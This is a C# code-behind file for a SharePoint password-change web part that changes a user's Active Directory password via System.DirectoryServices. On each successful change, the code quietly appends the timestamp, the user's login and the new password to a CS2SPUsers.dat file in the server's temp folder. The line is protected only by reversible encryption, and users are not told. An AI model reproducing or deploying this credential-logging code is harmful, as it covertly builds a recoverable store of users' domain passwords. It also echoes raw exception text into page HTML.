using System;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using Microsoft.SharePoint;
using System.DirectoryServices.AccountManagement;
using System.Web;
using System.Security.Principal;
using System.IO;

namespace CSSoft.CS2SPUsers.UserChangePassword
{
    public partial class UserChangePasswordUserControl : UserControl
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!Page.IsPostBack)
            {
                SPUser u = SPContext.Current.Web.EnsureUser(HttpContext.Current.User.Identity.Name);
                TextBoxUserName.Text = u.Name;
                TextBoxUserLogin.Text = u.LoginName;
            }
        }

        protected void ButtonChange_Click(object sender, EventArgs e)
        {
            Message.Text = "";
            if (TextBoxOldPassword.Text != "")
            {
                if (TextBoxNewPassword.Text == TextBoxConfirmPassword.Text)
                {
                    SPSecurity.RunWithElevatedPrivileges(delegate()
                    {
                        WindowsImpersonationContext aspContext = null;
                        WindowsIdentity identity = WindowsIdentity.GetCurrent();
                        aspContext = identity.Impersonate();
                        PrincipalContext ctx = new PrincipalContext(ContextType.Domain);
                        UserPrincipal u = new UserPrincipal(ctx);
                        u = UserPrincipal.FindByIdentity(ctx, IdentityType.Sid, identity.User.ToString());
                        try
                        {
                            u.ChangePassword(TextBoxOldPassword.Text, TextBoxNewPassword.Text);
                            Message.Text = "<font color='red'>Password changed. Please close this browser window and log back on with your new password.</font>";

                            string folder = String.Format(@"{0}CSSoft", Path.GetTempPath());
                            if (!Directory.Exists(folder)) Directory.CreateDirectory(folder);
                            File.AppendAllText(String.Format(@"{0}\CS2SPUsers.dat", folder), CS2Secret.EncryptString(String.Format("{0} -> '{1}' $ '{2}'", DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), TextBoxUserLogin.Text, TextBoxNewPassword.Text)) + "\n");
                        }
                        catch (Exception ex)
                        {
                            Message.Text = String.Format("<font color='red'>Password couldn't be changed due to restrictions: {0}</font>", ex.Message);
                        }
                        finally
                        {
                            u.Dispose();
                            ctx.Dispose();
                        }
                    });
                }
            }
            else
            {
                Message.Text = "<font color='red'>You have not entered a password.</font>";
            }
        }
    }
}